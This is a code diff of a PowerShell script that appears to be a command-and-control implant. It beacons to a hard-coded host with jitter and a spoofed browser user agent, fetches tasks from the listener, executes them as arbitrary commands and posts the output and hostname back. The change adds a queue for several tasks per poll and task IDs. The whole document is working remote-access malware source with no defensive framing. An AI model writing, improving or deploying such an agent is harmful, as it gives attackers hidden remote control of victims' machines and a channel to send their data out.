@@ -1,5 +1,5 @@
 param(
-  [string]$WHost = '10.10.150.1',
+  [string]$WHost = '10.10.100.1',
   [int]$WPort = 80,
   [string]$Key = '448b5e4bf0d8d311e4e94b79868885206ebaefce7294bbbb119a2467a9d9b6e3',
   [int]$MinBackoffSec = 5,
@@ -22,7 +22,7 @@ $pollUri     = "$baseUri/api/health"
 $reportedPid      = $pid
 $callbackInterval = 20
 $jitterPct        = 15
-$pendingTaskResult = $null
+$script:pendingTaskQueue = New-Object System.Collections.Queue
 $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
 
 # Pluggable task handlers registry
@@ -100,7 +100,11 @@ function Register-Agent {
   if ($etag) { $etag = $etag.Trim('"') }
   [pscustomobject]@{
     StatusCode       = $resp.StatusCode
-    SessionToken     = if ($etag) { $etag } elseif ($obj.PSObject.Properties.Name -contains 'session_key') { $obj.session_key } elseif ($obj.PSObject.Properties.Name -contains 'session_token') { $obj.session_token } elseif ($obj.PSObject.Properties.Name -contains 'sessionKey') { $obj.sessionKey } else { $null }
+    SessionToken     = if ($etag) { $etag } 
+                       elseif ($obj.PSObject.Properties.Name -contains 'session_key') { $obj.session_key } 
+                       elseif ($obj.PSObject.Properties.Name -contains 'session_token') { $obj.session_token } 
+                       elseif ($obj.PSObject.Properties.Name -contains 'sessionKey') { $obj.sessionKey } 
+                       else { $null }
     CallbackInterval = $null
     Raw              = $obj
   }
@@ -173,14 +177,21 @@ function Invoke-AgentTask {
 function Submit-TaskResult {
   param(
     [Parameter(Mandatory=$true)] [string]$ResultText,
-    [Parameter(Mandatory=$true)] [string]$SessionToken
+    [Parameter(Mandatory=$true)] [string]$SessionToken,
+    [string]$TaskId
   )
   try {
-    $payload = [pscustomobject]@{
-      task_result   = $ResultText
-      hostname      = $env:COMPUTERNAME
-      when          = (Get-Date).ToString('o')
-    } | ConvertTo-Json -Depth 4
+    $body = [ordered]@{
+      TaskResult  = $ResultText
+      task_result = $ResultText
+      hostname    = $env:COMPUTERNAME
+      when        = (Get-Date).ToString('o')
+    }
+    if ($TaskId -and $TaskId.Trim().Length -gt 0) {
+      $body.TaskID  = $TaskId
+      $body.task_id = $TaskId
+    }
+    $payload = ($body | ConvertTo-Json -Depth 4)
     # Listener expects session in header (kept for compatibility)
     $headers = @{ 'session' = $SessionToken }
     $r = Invoke-WebRequest -Uri $registerUri -Method POST -Headers $headers -ContentType 'application/json' -Body $payload -WebSession $Web
@@ -301,22 +312,114 @@ function Run-Task {
   return Invoke-AgentTask -Command $TaskText
 }
 
+function Invoke-TaskNode {
+  param([Parameter(Mandatory=$true)] $TaskNode)
+
+  $taskId = $null
+  $taskCmd = $null
+  $taskArgs = $null
+  $taskText = $null
+
+  if ($TaskNode -is [string]) {
+    $taskText = [string]$TaskNode
+    $segments = @([regex]::Split($taskText.Trim(), '[\s\u00A0]+') | Where-Object { $_ -and $_.Trim().Length -gt 0 })
+    if ($segments.Length -gt 0) {
+      $taskCmd = $segments[0]
+      if ($segments.Length -gt 1) { $taskArgs = ($segments[1..($segments.Length-1)] -join ' ') }
+    }
+  } else {
+    $taskMap = @{}
+    if ($TaskNode -is [hashtable]) {
+      foreach ($key in $TaskNode.Keys) {
+        $taskMap[$key.ToString().ToLower()] = $TaskNode[$key]
+      }
+    } elseif ($TaskNode -and $TaskNode.PSObject) {
+      foreach ($prop in $TaskNode.PSObject.Properties) {
+        $taskMap[$prop.Name.ToLower()] = $prop.Value
+      }
+    }
+    foreach ($candidate in @('taskid','task_id','id')) {
+      if ($taskMap.ContainsKey($candidate)) { $taskId = [string]$taskMap[$candidate]; break }
+    }
+    foreach ($candidate in @('taskcmd','taskcommand','command')) {
+      if ($taskMap.ContainsKey($candidate)) { $taskCmd = [string]$taskMap[$candidate]; break }
+    }
+    foreach ($candidate in @('taskargument','task_argument','taskargs','args','arguments')) {
+      if ($taskMap.ContainsKey($candidate)) { $taskArgs = [string]$taskMap[$candidate]; break }
+    }
+    foreach ($candidate in @('tasktext','task_text','taskstring','text')) {
+      if ($taskMap.ContainsKey($candidate)) { $taskText = [string]$taskMap[$candidate]; break }
+    }
+    if (-not $taskText) {
+      if ($taskCmd) {
+        $taskText = $taskCmd
+        if ($taskArgs -and $taskArgs.Trim().Length -gt 0) { $taskText = "$taskText $taskArgs" }
+      } elseif ($taskArgs) {
+        $taskText = $taskArgs
+      }
+    }
+  }
+
+  if (-not $taskText) { return }
+  $taskText = [string]$taskText
+  $taskText = $taskText.Trim()
+  if ($taskText.Length -le 0) { return }
+
+  if ($taskCmd -eq $null -and $taskText) {
+    $segments = @([regex]::Split($taskText, '[\s\u00A0]+') | Where-Object { $_ -and $_.Trim().Length -gt 0 })
+    if ($segments.Length -gt 0) {
+      $taskCmd = $segments[0]
+      if ($segments.Length -gt 1 -and -not $taskArgs) { $taskArgs = ($segments[1..($segments.Length-1)] -join ' ') }
+    }
+  }
+
+  $logMsg = if ($taskId) { "[task] Executing ($taskId): $taskText" } else { "[task] Executing: $taskText" }
+  Write-Host $logMsg
+  $res = Run-Task -TaskText $taskText
+  $maxLen = 32768
+  if ($null -eq $res) { $res = '' }
+  if ($res.Length -gt $maxLen) { $res = $res.Substring(0, $maxLen) + "... [truncated]" }
+  $entry = [pscustomobject]@{
+    ResultText   = $res
+    TaskID       = $taskId
+    TaskCMD      = $taskCmd
+    TaskArgument = $taskArgs
+    TaskText     = $taskText
+  }
+  $script:pendingTaskQueue.Enqueue($entry)
+  Write-Host ("[task] Captured {0} chars; queued results (pending={1})." -f $res.Length, $script:pendingTaskQueue.Count)
+}
+
 function Process-PollResponse {
   param([object]$Poll)
   if (-not $Poll -or $Poll.Code -ne 200) { return }
-  $taskCmd = $null
-  if ($Poll.Data -and $Poll.Data.PSObject -and $Poll.Data.PSObject.Properties.Name -contains 'Task') {
-    $taskCmd = [string]$Poll.Data.Task
-  } elseif ($Poll.Data -and $Poll.Data.PSObject -and $Poll.Data.PSObject.Properties.Name -contains 'task') {
-    $taskCmd = [string]$Poll.Data.task
+  $taskNodes = @()
+  if ($Poll.Data -and $Poll.Data.PSObject -and $Poll.Data.PSObject.Properties) {
+    foreach ($propName in @('Tasks','tasks')) {
+      if ($Poll.Data.PSObject.Properties.Name -contains $propName) {
+        $rawTasks = $Poll.Data.$propName
+        if ($rawTasks -is [System.Collections.IEnumerable]) {
+          foreach ($tn in $rawTasks) {
+            if ($null -ne $tn) { $taskNodes += $tn }
+          }
+        } elseif ($rawTasks) {
+          $taskNodes += $rawTasks
+        }
+        if ($taskNodes.Count -gt 0) { break }
+      }
+    }
+    if ($taskNodes.Count -eq 0) {
+      if ($Poll.Data.PSObject.Properties.Name -contains 'Task') {
+        $taskNodes += $Poll.Data.Task
+      } elseif ($Poll.Data.PSObject.Properties.Name -contains 'task') {
+        $taskNodes += $Poll.Data.task
+      }
+    }
   }
-  if ($taskCmd -and $taskCmd.Trim().Length -gt 0) {
-    Write-Host ("[task] Executing: {0}" -f $taskCmd)
-    $res = Run-Task -TaskText $taskCmd
-    $maxLen = 32768
-    if ($res.Length -gt $maxLen) { $res = $res.Substring(0, $maxLen) + "... [truncated]" }
-    $script:pendingTaskResult = $res
-    Write-Host ("[task] Captured {0} chars; will return next check-in." -f $script:pendingTaskResult.Length)
+  if (-not $taskNodes -or $taskNodes.Count -eq 0) { return }
+  foreach ($tn in $taskNodes) {
+    if ($null -eq $tn) { continue }
+    Invoke-TaskNode -TaskNode $tn
   }
 }
 
@@ -339,13 +442,21 @@ $justRegistered = $true
 while ($true) {
   $tickStart = Get-Date
   $didPostThisCycle = $false
-  # If we have a pending result from a previously executed task, push it up first
-  if ($pendingTaskResult -and $pendingTaskResult.Trim().Length -gt 0) {
-    $submit = Submit-TaskResult -ResultText $pendingTaskResult -SessionToken $sessionToken
+  # If we have pending results from previously executed tasks, push the oldest first
+  if ($script:pendingTaskQueue.Count -gt 0) {
+    $nextEntry = $script:pendingTaskQueue.Peek()
+    $resultPayload = if ($null -ne $nextEntry.ResultText) { [string]$nextEntry.ResultText } else { '' }
+    $taskIdForSubmit = $null
+    if ($nextEntry -and $nextEntry.PSObject -and $nextEntry.PSObject.Properties.Name -contains 'TaskID') {
+      $taskIdForSubmit = [string]$nextEntry.TaskID
+    } elseif ($nextEntry -and $nextEntry.TaskID) {
+      $taskIdForSubmit = [string]$nextEntry.TaskID
+    }
+    $submit = Submit-TaskResult -ResultText $resultPayload -SessionToken $sessionToken -TaskId $taskIdForSubmit
     if ($submit -and $submit.Success) {
       if ($submit.NewSessionToken) { $sessionToken = $submit.NewSessionToken }
       if ($submit.CallbackInterval) { $callbackInterval = $submit.CallbackInterval }
-      $pendingTaskResult = $null
+      $null = $script:pendingTaskQueue.Dequeue()
       $didPostThisCycle = $true
     }
   }
